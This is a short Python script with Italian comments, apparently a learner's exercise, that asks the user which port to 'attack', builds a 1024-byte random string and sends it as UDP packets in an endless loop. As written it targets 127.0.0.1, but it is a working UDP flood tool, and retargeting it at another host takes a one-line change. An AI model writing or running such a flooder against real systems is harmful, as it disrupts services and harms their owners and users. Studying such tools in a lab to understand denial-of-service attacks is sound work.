import random
import socket
import string




PORTA = int(input("Quale porta desideri attaccare? \n"))
INDIRIZZO = "127.0.0.1"

SOCKET = (INDIRIZZO, PORTA) #il socket viene riportato in una tupla, dove nella prima posizione c'è l'indirizzo ip e nella seconda posizione c'è la porta

buffersize = 1024 # dimensione del buffer

#creo una funzione per generare una stringa random 
def genera_stringa_random(lung):
        caratteri = string.ascii_letters + string.digits + string.punctuation
        stringa_random = '' # inizializzo la stringa come stringa vuota, creo poi un ciclo che continuerà finchè la lunghezza della stringa random è < del parametro lungh (che nell'esecuzione del programma sarà nient'altro che il buffer)
        while len(stringa_random) < lung:
                random_char = random.choice(caratteri)
                stringa_random += random_char
        #nel ciclo while uso il metodo choice della libreria random che sceglie un carattere a caso tra quelli disponibili nella stringa
        return stringa_random



pacchetto = genera_stringa_random(buffersize)    #invoco la funzione
print(pacchetto)    #stampo il pacchetto per prova

message = str.encode(pacchetto) #codifico il messaggio


#eseguo un ciclo infinito, dove mi collego al server e continuo a mandare il pacchetto della dimensione indicata
while True:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(message,SOCKET)

#nella prossima prova proverò a non usare il with per vedere cosa succede, in quanto il with chiude in automatico la connessione stabilita, una volta inviato il messaggio!